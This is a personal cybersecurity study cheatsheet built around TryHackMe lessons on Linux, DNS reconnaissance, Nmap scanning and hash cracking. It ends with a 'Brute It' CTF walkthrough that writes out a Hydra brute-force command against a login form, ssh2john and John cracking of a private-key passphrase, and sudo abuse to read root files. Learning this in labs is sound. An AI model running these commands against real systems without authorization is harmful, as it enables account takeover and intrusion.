# Cybersecurity Journey — Tools & Commands Cheatsheet

> Only tools, commands, and useful information actually learned during the journey.

---

# Day 01 — Cybersecurity Foundations

## TryHackMe

**Tool / Platform:** TryHackMe

Used to learn the basic difference between offensive and defensive security and the role of cybersecurity professionals.

## Offensive Security

Focuses on finding and demonstrating weaknesses in systems.

```text
Reconnaissance
      ↓
Enumeration
      ↓
Vulnerability Discovery
      ↓
Exploitation
```

## Defensive Security

Focuses on protecting systems, detecting attacks, and responding to incidents.

```text
Prevention
Detection
Monitoring
Incident Response
Recovery
```

## CTF

Capture The Flag environments provide controlled challenges for practicing cybersecurity skills.

```text
CTF → Practice in an authorized environment
```

---

# Day 02 — Linux Fundamentals

## Linux Terminal

The terminal provides a command-line interface for interacting with a Linux system.

## Commands Learned

### `pwd`

Shows the current working directory.

```bash
pwd
```

### `ls`

Lists files and directories.

```bash
ls
ls -l
ls -la
```

### `cd`

Changes the current directory.

```bash
cd directory
cd ..
cd ~
```

### `cat`

Displays file contents.

```bash
cat file.txt
```

### `less`

Reads a file page by page.

```bash
less file.txt
```

### `head`

Displays the beginning of a file.

```bash
head file.txt
```

### `tail`

Displays the end of a file.

```bash
tail file.txt
```

### `touch`

Creates an empty file.

```bash
touch file.txt
```

### `mkdir`

Creates a directory.

```bash
mkdir directory
```

### `cp`

Copies files or directories.

```bash
cp file.txt backup.txt
```

### `mv`

Moves or renames files.

```bash
mv old.txt new.txt
```

### `rm`

Removes files.

```bash
rm file.txt
```

### `rmdir`

Removes an empty directory.

```bash
rmdir directory
```

### `find`

Searches for files and directories.

```bash
find . -name "file.txt"
```

### `grep`

Searches text for a pattern.

```bash
grep "text" file.txt
```

### `echo`

Prints text.

```bash
echo "Hello"
```

Write text to a file:

```bash
echo "Hello" > file.txt
```

Append text:

```bash
echo "Another line" >> file.txt
```

## File Permissions

Linux permissions are commonly represented as:

```text
r → read
w → write
x → execute
```

Example:

```text
-rwxr-xr--
```

Permissions are associated with:

```text
Owner
Group
Others
```

---

# Day 03 — Networking Fundamentals

## Networking

A network allows systems to communicate with each other.

Basic model:

```text
Device
  ↓
Network
  ↓
Other Device
```

## IP Address

Identifies a network interface logically.

Example:

```text
192.168.1.10
```

## IPv4

IPv4 addresses contain four decimal octets.

Example:

```text
192.168.1.10
```

Each octet ranges from:

```text
0 - 255
```

## IPv6

IPv6 uses a much larger address space than IPv4.

Example:

```text
2001:db8::1
```

## MAC Address

Identifies a network interface at the local network/link layer.

```text
IP address  → logical network address
MAC address → local network interface
```

## Port

A numbered communication endpoint.

```text
0 - 65535
```

Think:

```text
IP address = building
Port        = door
Service     = what is behind the door
```

## TCP

Transmission Control Protocol.

```text
Connection-oriented
Reliable
Ordered
```

## UDP

User Datagram Protocol.

```text
Connectionless
Lower overhead
```

Memory:

```text
TCP → connection-oriented
UDP → connectionless
```

## DNS

Domain Name System.

Converts names such as:

```text
example.com
```

into network addresses such as:

```text
93.184.216.34
```

## Common Ports Learned

```text
21   → FTP
22   → SSH
23   → Telnet
25   → SMTP
53   → DNS
80   → HTTP
443  → HTTPS
445  → SMB
3389 → RDP
```

---

# Day 04 — Security / CTF Foundations

## Security Concepts

### Vulnerability

A weakness that can potentially be exploited.

### Exploit

A technique or code that takes advantage of a vulnerability.

### Payload

Data or instructions delivered as part of an attack/exploitation process.

### Threat

Something capable of causing harm to a system or organization.

### Risk

The potential impact of a threat exploiting a vulnerability.

Basic relationship:

```text
Threat
   ↓
Vulnerability
   ↓
Exploit
   ↓
Impact
```

## CTF Methodology

A basic approach:

```text
Understand target
      ↓
Gather information
      ↓
Enumerate
      ↓
Identify weakness
      ↓
Exploit when appropriate
      ↓
Capture flag
```

All practical exploitation should remain within authorized environments.

---

# Day 05 — Passive Reconnaissance

## Passive Reconnaissance

Gathering information about a target without directly interacting with the target's systems.

```text
Public Information
        ↓
Reconnaissance
        ↓
Target Information
```

## WHOIS

Used to retrieve domain registration information.

May provide:

```text
Registrar
Registration dates
Name servers
Domain status
```

## RDAP

Registration Data Access Protocol.

Modern structured alternative to traditional WHOIS.

```text
WHOIS → traditional registration lookup
RDAP  → modern structured registration lookup
```

## DNS

Domain Name System.

```text
example.com
     ↓
DNS
     ↓
IP address
```

## DNS Records

### A

Maps a hostname to an IPv4 address.

```text
A → IPv4
```

### AAAA

Maps a hostname to an IPv6 address.

```text
AAAA → IPv6
```

### CNAME

Alias for another hostname.

```text
CNAME → Alias
```

### MX

Specifies mail servers.

```text
MX → Mail server
```

### NS

Specifies authoritative name servers.

```text
NS → Name server
```

### TXT

Contains publicly available text/configuration information.

```text
TXT → Public text/configuration
```

## nslookup

Basic DNS lookup:

```bash
nslookup example.com
```

Query a specific record:

```bash
nslookup -type=MX example.com
```

## dig

Basic DNS query:

```bash
dig example.com
```

MX:

```bash
dig example.com MX
```

TXT:

```bash
dig example.com TXT
```

NS:

```bash
dig example.com NS
```

Memory:

```text
nslookup → simple DNS investigation
dig      → detailed DNS investigation
```

## Subdomains

Additional hostnames under a domain.

Example:

```text
example.com
├── www.example.com
├── mail.example.com
├── api.example.com
└── dev.example.com
```

Subdomains can reveal additional applications and infrastructure.

## Certificate Transparency

Public records of issued TLS certificates.

Can help identify:

```text
Domains
Subdomains
Related hostnames
```

## DNSDumpster

Web-based reconnaissance tool for discovering:

```text
DNS information
Subdomains
Hostnames
Related infrastructure
```

## Shodan

Search engine for Internet-connected devices and services.

Can reveal:

```text
IP addresses
Open ports
Services
Software banners
Device information
```

---

# Day 06 — Active Reconnaissance

## Active Reconnaissance

Directly interacting with an authorized target.

```text
Passive Recon
     ↓
Public information

Active Recon
     ↓
Direct communication with target
```

Active reconnaissance can be detected by the target.

## ping

Used to test whether a host responds to ICMP Echo Requests.

```bash
ping TARGET_IP
```

Send a specific number of requests:

```bash
ping -c 5 TARGET_IP
```

Change ICMP data/payload size:

```bash
ping -s 100 TARGET_IP
```

### `ping` Flags

```text
-c → number of requests
-s → ICMP data/payload size
```

## ICMP

Internet Control Message Protocol.

Ping commonly uses:

```text
ICMP Echo Request
        ↓
      Target
        ↓
ICMP Echo Reply
```

ICMP Echo header:

```text
8 bytes
```

Important:

```text
No ping response ≠ Host is definitely offline
```

A firewall can filter ICMP traffic.

## traceroute

Investigates the network path between the source and target.

```bash
traceroute TARGET_IP
```

Conceptually:

```text
Source
  ↓
Hop 1
  ↓
Hop 2
  ↓
Hop 3
  ↓
Target
```

A hop can represent an intermediate router or network device.

## Telnet

Can establish a TCP connection to a specific port.

```bash
telnet TARGET_IP 80
```

Can be used to interact manually with a service.

## HTTP Through Telnet

A basic HTTP request can be sent after connecting to a web server.

```http
GET / HTTP/1.1
```

An HTTP response may expose:

```text
HTTP version
Server software
Server version
Possible OS information
```

## Banner Grabbing

Obtaining information exposed by a network service.

Example:

```text
Server: Apache/2.4.61 (Debian)
```

Can reveal:

```text
Software → Apache
Version  → 2.4.61
OS hint  → Debian
```

## Netcat

Command:

```bash
nc
```

Basic connection:

```bash
nc TARGET_IP PORT
```

Example:

```bash
nc TARGET_IP 21
```

Netcat can:

```text
Test TCP connections
Connect to services
Read service banners
Send basic data
Interact with network services
```

## FTP

Port 21 is commonly associated with FTP.

Netcat can be used to connect to the FTP service and observe its banner:

```bash
nc TARGET_IP 21
```

## TCP vs UDP

```text
TCP → connection-oriented
UDP → connectionless
```

## HTTPS

HTTPS uses TLS encryption.

Common port:

```text
443
```

Telnet itself does not provide TLS encryption.

---

# Day 07–08 — Nmap Live Host Discovery

## Nmap

Nmap stands for:

```text
Network Mapper
```

Nmap is used for network exploration and security auditing.

The focus so far is:

```text
Host Discovery
```

Main question:

```text
Which hosts are alive?
```

## Target Specification

Single IP:

```bash
nmap TARGET_IP
```

IP range:

```bash
nmap 10.10.12.15-20
```

CIDR subnet:

```bash
nmap 10.10.12.13/29
```

Read targets from a file:

```bash
nmap -iL list_of_hosts.txt
```

List targets without scanning:

```bash
nmap -sL TARGETS
```

## CIDR

A `/29` network contains:

```text
8 IP addresses
```

Example:

```text
10.10.12.13/29
```

Network range:

```text
10.10.12.8 - 10.10.12.15
```

A `/24` network contains:

```text
256 IP addresses
```

Example:

```text
10.48.182.148/24
```

Range:

```text
10.48.182.0 - 10.48.182.255
```

Important:

```text
Addresses scanned ≠ Live hosts discovered
```

Example:

```text
256 addresses scanned
7 hosts up
```

means Nmap checked 256 possible addresses and found 7 live hosts.

## Host Discovery Without Port Scanning

The `-sn` option performs host discovery without performing a port scan.

```bash
nmap -sn TARGET
```

Example:

```bash
nmap -sn 10.48.182.148/24
```

Purpose:

```text
Find live hosts
```

Not:

```text
Find open ports
```

## ICMP Host Discovery

### ICMP Echo

```bash
nmap -PE TARGET
```

```text
-PE → ICMP Echo
```

### ICMP Timestamp

```bash
nmap -PP TARGET
```

```text
-PP → ICMP Timestamp
```

### ICMP Address Mask

```bash
nmap -PM TARGET
```

```text
-PM → ICMP Address Mask
```

Memory:

```text
-PE → Echo
-PP → Timestamp
-PM → Address Mask
```

## TCP Host Discovery

### TCP SYN Ping

```bash
nmap -PS TARGET
```

Specific port:

```bash
nmap -PS23 TARGET
```

Port 23 is commonly associated with Telnet.

```text
-PS → TCP SYN ping
```

### TCP ACK Ping

```bash
nmap -PA TARGET
```

```text
-PA → TCP ACK ping
```

Privilege difference:

```text
TCP SYN ping → does not require a privileged account
TCP ACK ping → requires a privileged account
```

## ARP Host Discovery

ARP stands for:

```text
Address Resolution Protocol
```

Used on local networks to determine the MAC address associated with an IP address.

Conceptually:

```text
Host A
  ↓
ARP Request
"Who has this IP?"
  ↓
Local Network
  ↓
Target Host
  ↓
ARP Reply
```

Important:

```text
ARP broadcasts do not normally cross routers.
```

## Reverse DNS

Nmap can perform reverse DNS lookups to resolve IP addresses into hostnames.

Conceptually:

```text
IP Address
    ↓
Reverse DNS
    ↓
Hostname
```

Disable DNS resolution:

```bash
nmap -n TARGET
```

```text
-n → disable DNS resolution
```

## Nmap Flags Learned

```text
-sn → host discovery without port scanning
-sL → list targets without scanning
-iL → read targets from a file
-n  → disable DNS resolution

-PE → ICMP Echo discovery
-PP → ICMP Timestamp discovery
-PM → ICMP Address Mask discovery

-PS → TCP SYN ping
-PA → TCP ACK ping
```

---

# Quick Command Reference

## Linux

```bash
pwd
ls
ls -l
ls -la
cd directory
cd ..
cd ~
cat file.txt
less file.txt
head file.txt
tail file.txt
touch file.txt
mkdir directory
cp file.txt backup.txt
mv old.txt new.txt
rm file.txt
rmdir directory
find . -name "file.txt"
grep "text" file.txt
echo "Hello"
echo "Hello" > file.txt
echo "Another line" >> file.txt
```

## DNS

```bash
nslookup example.com
nslookup -type=MX example.com

dig example.com
dig example.com MX
dig example.com TXT
dig example.com NS
```

## Network

```bash
ping TARGET_IP
ping -c 5 TARGET_IP
ping -s 100 TARGET_IP
traceroute TARGET_IP
```

## Service Interaction

```bash
telnet TARGET_IP 80
nc TARGET_IP PORT
nc TARGET_IP 21
```

## Nmap

```bash
nmap TARGET_IP
nmap 10.10.12.15-20
nmap 10.10.12.13/29
nmap -iL list_of_hosts.txt
nmap -sL TARGETS

nmap -sn TARGET
nmap -PE TARGET
nmap -PP TARGET
nmap -PM TARGET

nmap -PS TARGET
nmap -PS23 TARGET
nmap -PA TARGET

nmap -n TARGET
```
---

# Day 09–10 — Further Nmap

## Nmap Scanning

Nmap can be used to discover open ports and identify services running on a target.

## Port Scanning

Scan a specific port:

```bash
nmap -p 80 TARGET_IP
```

Scan multiple ports:

```bash
nmap -p 22,80,443 TARGET_IP
```

Scan a range of ports:

```bash
nmap -p 1-1000 TARGET_IP
```

Scan all TCP ports:

```bash
nmap -p- TARGET_IP
```

## TCP Connect Scan

```bash
nmap -sT TARGET_IP
```

```text
-sT → TCP Connect Scan
```

Completes the TCP connection with the target.

## TCP SYN Scan

```bash
nmap -sS TARGET_IP
```

```text
-sS → TCP SYN Scan
```

Sends a SYN packet and analyzes the response without completing the normal TCP connection.

```text
SYN
 ↓
SYN/ACK → Open
RST     → Closed
```

## UDP Scan

```bash
nmap -sU TARGET_IP
```

```text
-sU → UDP Scan
```

UDP is connectionless, so UDP scanning works differently from TCP scanning and can take longer.

## Service and Version Detection

```bash
nmap -sV TARGET_IP
```

```text
-sV → Service/version detection
```

Attempts to identify the service and version running on an open port.

## OS Detection

```bash
nmap -O TARGET_IP
```

```text
-O → OS detection
```

Attempts to identify the target's operating system.

## Aggressive Scan

```bash
nmap -A TARGET_IP
```

```text
-A → Aggressive scan
```

Enables several advanced detection features, including OS detection, version detection, script scanning, and traceroute.

## Timing

Nmap provides timing templates:

```bash
nmap -T0 TARGET_IP
nmap -T1 TARGET_IP
nmap -T2 TARGET_IP
nmap -T3 TARGET_IP
nmap -T4 TARGET_IP
nmap -T5 TARGET_IP
```

```text
T0 → Very slow
T1 → Slow
T2 → Polite
T3 → Normal
T4 → Aggressive
T5 → Very aggressive
```

## Port States

```text
open
closed
filtered
```

```text
Open
→ A service is listening on the port.

Closed
→ The port is reachable but no service is listening.

Filtered
→ Filtering prevents Nmap from determining the port state.
```

## Nmap Scripting Engine

NSE stands for:

```text
Nmap Scripting Engine
```

NSE scripts extend Nmap's capabilities.

Run the default scripts:

```bash
nmap -sC TARGET_IP
```

```text
-sC → Default NSE scripts
```

Run a specific script:

```bash
nmap --script SCRIPT_NAME TARGET_IP
```

List available scripts:

```bash
ls /usr/share/nmap/scripts/
```

## Useful Scan Combinations

Service/version detection:

```bash
nmap -sV TARGET_IP
```

Default scripts + version detection:

```bash
nmap -sC -sV TARGET_IP
```

All ports + version detection:

```bash
nmap -p- -sV TARGET_IP
```

All ports + default scripts + version detection:

```bash
nmap -p- -sC -sV TARGET_IP
```

## Saving Nmap Results

Normal output:

```bash
nmap -oN scan.txt TARGET_IP
```

```text
-oN → Normal output
```

XML output:

```bash
nmap -oX scan.xml TARGET_IP
```

```text
-oX → XML output
```

Grepable output:

```bash
nmap -oG scan.txt TARGET_IP
```

```text
-oG → Grepable output
```

Save multiple output formats:

```bash
nmap -oA scan TARGET_IP
```

```text
-oA → Save output in multiple formats
```

## Nmap Flag Reference

```text
-p       → Specify ports
-p-      → Scan all ports

-sT      → TCP Connect Scan
-sS      → TCP SYN Scan
-sU      → UDP Scan

-sV      → Service/version detection
-O       → OS detection
-A       → Aggressive scan
-sC      → Default NSE scripts

-T0      → Very slow timing
-T1      → Slow timing
-T2      → Polite timing
-T3      → Normal timing
-T4      → Aggressive timing
-T5      → Very aggressive timing

-oN      → Normal output
-oX      → XML output
-oG      → Grepable output
-oA      → Multiple output formats

--script → Run an NSE script
```
# Day 11 — Linux Fundamentals, Hashing & File Operations

## Linux File Searching

### Find a File by Name

```bash
find / -type f -name "filename"
```

### Find a Directory by Name

```bash
find / -type d -name "directory"
```

### Find Files by Size

```bash
find /home -type f -size 52k
```

Common size suffixes:

```text
c = bytes
k = kilobytes
M = megabytes
G = gigabytes
```

### Find Files Owned by a User

```bash
find /home -type f -user username
```

### Suppress Permission Errors

```bash
find / -type f -name "filename" 2>/dev/null
```

---

## Searching File Contents

### Recursive Case-Insensitive Search

```bash
grep -iRl "keyword" /path
```

Options:

```text
-i = case-insensitive
-R = recursive
-l = show matching filenames
```

---

## File Operations

### Copy

```bash
cp file.txt /destination/
```

### Copy a File with Spaces

```bash
cp "encryption keys" /home/john/logs
```

### Move

```bash
mv file.txt /destination/
```

### Rename

```bash
mv oldname.txt newname.txt
```

### Move Multiple Files

```bash
mv file1 file2 file3 -t /destination/
```

### Move Everything from Current Directory

```bash
mv * /destination/
```

### Rename a Filename Beginning with `-`

```bash
mv -- -logs -newlogs
```

### Create a File

```bash
touch file.txt
```

### Create a Directory

```bash
mkdir directory
```

### Read a File

```bash
cat file.txt
```

### Edit a File

```bash
nano file.txt
```

---

## SSH

### Connect to a Remote Machine

```bash
ssh username@MACHINE_IP
```

Example:

```bash
ssh sarah@MACHINE_IP
```

Important:

```text
AttackBox IP ≠ Lab Machine IP
```

When working with TryHackMe, make sure the target IP belongs to the **Lab Machine**.

---

## SCP

### Copy a Local File to a Remote Machine

```bash
scp file.txt username@MACHINE_IP:/destination/
```

Example:

```bash
scp script.py john@192.168.10.5:/home/john/scripts
```

### SCP Mental Model

```text
scp
 ↓
source
 ↓
username@IP
 ↓
destination
```

---

# Hashing

## Common Hash Types Encountered

```text
MD4
MD5
SHA-1
SHA-256
```

### Important

```text
Hashing ≠ Encryption
```

Hashing is generally designed as a one-way transformation.

---

## Identify a Hash

```bash
hash-identifier HASH
```

Example:

```bash
hash-identifier f9d4049dd6a4dc35d40e5265954b2a46
```

Hash identification tools provide likely possibilities; they should not automatically be treated as definitive.

---

# John the Ripper

## Basic Wordlist Attack

```bash
john --wordlist=/path/to/wordlist hash.txt
```

### Show Cracked Passwords

```bash
john --show hash.txt
```

### Specify a Hash Format

```bash
john --format=FORMAT --wordlist=/path/to/wordlist hash.txt
```

Example:

```bash
john --format=raw-md4 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Basic John Workflow

```text
Hash
 ↓
Identify format
 ↓
Select wordlist
 ↓
Run John
 ↓
john --show
```

---

# Base64

## Decode a Base64 File

```bash
base64 -d encoded.txt
```

## Important Distinction

```text
Encoding
    ↓
Changes representation

Encryption
    ↓
Protects data using a key/password
```

Base64 is **not encryption**.

---

# GPG

## Encrypt a File Using AES-128

```bash
gpg --cipher-algo AES-128 --symmetric history_logs.txt
```

This produces:

```text
history_logs.txt.gpg
```

### Decrypt a GPG File

```bash
gpg history_logs.txt.gpg
```

### Basic GPG Workflow

```text
Readable file
     ↓
    GPG
     ↓
Encrypted .gpg file
     ↓
Password
     ↓
Decrypted file
```

---

# Cracking GPG Files

## Convert a GPG File for John

```bash
gpg2john encrypted.gpg > hash.txt
```

## Crack with John

```bash
john --format=gpg --wordlist=/path/to/wordlist hash.txt
```

## Show the Recovered Password

```bash
john --show hash.txt
```

### GPG Cracking Workflow

```text
encrypted.gpg
      ↓
   gpg2john
      ↓
    hash.txt
      ↓
John + wordlist
      ↓
   password
      ↓
     gpg
      ↓
 decrypted file
```

---

# MySQL / SQL

## Start MySQL

```bash
service mysql start
```

## Stop MySQL

```bash
service mysql stop
```

## Connect to MySQL

```bash
mysql -u username -p
```

## Connect to a Remote MySQL Database

```bash
mysql -u username -p -h HOST_IP
```

## Load a SQL File

Inside MySQL:

```sql
source database.sql;
```

## List Databases

```sql
SHOW DATABASES;
```

## Select a Database

```sql
USE database_name;
```

## List Tables

```sql
SHOW TABLES;
```

## Inspect Table Structure

```sql
DESCRIBE table_name;
```

## Read Table Contents

```sql
SELECT * FROM table_name;
```

---

# Useful Linux Investigation Pattern

When looking for something unknown:

```text
1. Locate it
   ↓
find

2. Inspect it
   ↓
cat

3. Search its contents
   ↓
grep

4. Identify what it is
   ↓
hash-identifier / file / other tools

5. Process or crack it when appropriate
   ↓
John / gpg / other tools

6. Follow the information
   ↓
SSH / SQL / filesystem navigation
```

---

# Day 11 Security Lessons

- Filesystem enumeration is a core Linux skill.
- `find` can search based on multiple properties.
- `grep` can reveal information hidden inside files.
- SSH provides remote command-line access.
- SCP provides secure file transfer.
- Hashes can be identified and attacked with wordlists when appropriate.
- John the Ripper is useful for password recovery in authorized labs.
- Base64 is encoding, not encryption.
- GPG provides file encryption and decryption.
- GPG files can be converted into John-compatible hashes using `gpg2john`.
- SQL databases can be investigated directly from Linux.
- Linux fundamentals are foundational for later enumeration and privilege-escalation work.

## Day 12 — Brute It

### Nmap Service and Version Detection

    nmap -sC -sV MACHINE_IP

`-sC` runs Nmap's default scripts and `-sV` detects service and version information.

When reading the output, check the `STATE` column to identify open ports and the `VERSION` column to identify software versions.

Example:

    22/tcp  open  ssh   OpenSSH 7.6p1
    80/tcp  open  http  Apache httpd 2.4.29

### Gobuster Directory Enumeration

    gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt

Used to discover hidden directories and files on a web server.

Useful HTTP status codes:

- `200` — resource exists
- `301` — permanent redirect
- `302` — temporary redirect
- `403` — forbidden
- `404` — not found

A result such as `/admin (Status: 301)` means the directory exists and may redirect to `/admin/`.

### Curl

Retrieve a webpage from the terminal:

    curl http://MACHINE_IP/admin/

Save a webpage:

    curl -s http://MACHINE_IP/admin/ -o admin.html

Read the saved page:

    cat admin.html

Search the HTML for useful information:

    grep -iE "user|pass|login|admin|comment" admin.html

HTML comments can contain information that is not visible on the rendered webpage.

### Hydra

Hydra can automate password guessing against authentication services in authorized labs.

HTTP POST form syntax:

    hydra -l USERNAME -P WORDLIST MACHINE_IP http-post-form "/PATH/:user=^USER^&pass=^PASS^:F=FAILURE_MESSAGE"

Example used in Brute It:

    hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"

Important options:

- `-l` — single username
- `-P` — password wordlist
- `^USER^` — username placeholder
- `^PASS^` — password placeholder
- `http-post-form` — HTTP POST authentication
- `F=` — text identifying a failed login

### Wordlists

Check for the RockYou password list:

    ls /usr/share/wordlists/rockyou.txt

RockYou is commonly used for password-guessing and password-cracking exercises in CTF environments.

### SSH

Set private-key permissions:

    chmod 600 id_rsa

Connect using an SSH private key:

    ssh -i id_rsa john@MACHINE_IP

An SSH private key may be protected by a passphrase. The key and its passphrase are separate pieces of authentication information.

### ssh2john

Find the installed tool:

    which ssh2john

Convert an encrypted SSH private key into a John-compatible hash:

    python3 /usr/local/bin/ssh2john id_rsa > id_rsa.hash

The generated hash can be checked with:

    cat id_rsa.hash

A valid SSH hash generated by this tool may begin with:

    $sshng$

### John the Ripper

Crack an SSH private-key hash using RockYou:

    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Show the recovered password/passphrase:

    john --show id_rsa.hash

General workflow:

    id_rsa
      ↓
    ssh2john
      ↓
    id_rsa.hash
      ↓
    John the Ripper
      ↓
    recovered passphrase

### Linux Privilege Escalation

Check what commands the current user can run with sudo:

    sudo -l

In Brute It, the important permission was:

    (root) NOPASSWD: /bin/cat

This means the user was allowed to execute `/bin/cat` as root without providing a password.

An allowed command can sometimes be abused to access files that the normal user cannot read. In the authorized lab, the root flag could be read with:

    sudo /bin/cat /root/root.txt

### SUID Files

Search for files with the SUID permission:

    find / -perm -4000 -type f 2>/dev/null

SUID allows an executable to run with the permissions of its owner. SUID programs therefore need to be investigated carefully when looking for possible privilege-escalation paths.

### Attack Surface

An attack surface is the collection of services, applications, ports, and other entry points exposed by a system.

A basic reconnaissance mindset is:

    What is exposed?
        ↓
    What service is running?
        ↓
    What version is running?
        ↓
    What can I discover about it?
        ↓
    Is there something worth investigating?

### Brute It Attack Chain

    Nmap
      ↓
    Open ports
      ↓
    Service/version detection
      ↓
    Gobuster
      ↓
    Hidden /admin/ directory
      ↓
    HTML source inspection
      ↓
    Username discovery
      ↓
    Hydra
      ↓
    Admin password discovery
      ↓
    RSA private key
      ↓
    ssh2john
      ↓
    John the Ripper
      ↓
    SSH access
      ↓
    sudo -l
      ↓
    Privilege escalation
      ↓
    Root

### Day 12 Key Lessons

- `nmap -sC -sV` can identify open ports, services, and versions.
- Gobuster can enumerate hidden web directories.
- `curl` can be useful for investigating websites from the terminal.
- HTML comments can reveal information that is not visible on a webpage.
- Hydra can automate password guessing against authorized login forms.
- Wordlists are used for systematic password and directory testing.
- SSH can authenticate using private keys.
- `ssh2john` converts encrypted SSH keys into a format John the Ripper can process.
- John the Ripper can crack password-protected hashes using wordlists.
- `sudo -l` is useful for investigating privilege-escalation opportunities.
- Misconfigured sudo permissions can allow a low-privileged user to perform actions as root.
- Complex CTFs combine many individual concepts, making strong fundamentals important before attempting more advanced machines.